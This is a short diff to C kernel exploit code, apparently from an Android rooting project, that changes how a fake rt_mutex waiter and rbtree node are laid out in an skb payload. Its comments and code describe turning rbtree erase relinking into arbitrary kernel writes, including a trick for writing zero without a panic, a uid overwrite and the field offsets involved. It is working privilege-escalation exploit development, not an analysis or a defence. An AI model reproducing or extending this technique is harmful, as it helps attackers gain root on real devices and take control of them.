@@ -376,14 +376,22 @@ int prepare_skb_payload(uintptr_t base) {
        * tree_entry[0x18] pi_tree_entry[0x18] task@0x30 lock@0x38
        * wake_state@0x40 prio@0x44 deadline@0x48 ww_ctx@0x50
        *
-       * TCP rides the main_tcp word convention (Root-My-Pixel-Payloads src/61, tokay
-       * default shape): pi pc carries the value, rb_left the
-       * destination; the erase left-only relink stores
+       * TCP nonzero values ride the main_tcp convention
+       * (Root-My-Pixel-Payloads src/61, tokay default shape): pi pc
+       * carries the value, rb_left the destination; the erase
+       * left-only relink stores
        * *(dest) := pc before anything is derived from pc. rb_right must
-       * stay 0: with a nonzero right the erase takes the one-child arm
-       * and its second write clobbers *(value+0) with dest-8 (houji W2
-       * read that back as uid=upper32(dest-8)). The pselect fallback
-       * keeps the fdset-stamped stack-waiter words.
+       * stay 0 there: a nonzero right takes the one-child arm whose
+       * second write clobbers *(value+0) with dest-8 (houji W2 read
+       * that back as uid=upper32(dest-8)).
+       *
+       * Zero-value writes keep the target-8 shape instead: pc=0 leaves
+       * the relink parentless, which stamps dest into fake_task's
+       * pi_waiters root; the next enqueue_pi walks dest as an rb_node
+       * and trashes the task head (houji W3 panic). With pc=dest-8 the
+       * change_child else-branch stores 0 at *dest and the red victim
+       * makes rebalance NULL (rbtree_augmented.h case 1), so nothing
+       * else runs. The pselect fallback uses these words everywhere.
        *
        * prio must stay > DEFAULT_PRIO (120): only then does the stale
        * waiter insert left of W0, become top waiter, and reach the
@@ -394,7 +402,7 @@ int prepare_skb_payload(uintptr_t base) {
       put64(p, W0_OFF + 0x00, 1);           /* tree_entry.rb_parent_color */
       put64(p, W0_OFF + 0x08, 0);           /* tree_entry.rb_right */
       put64(p, W0_OFF + 0x10, 0);           /* tree_entry.rb_left */
-      if (tcp) {
+      if (tcp && write_right) {
         put64(p, W0_OFF + 0x18, write_right);
         put64(p, W0_OFF + 0x20, 0);
         put64(p, W0_OFF + 0x28, pselect_custom_target);
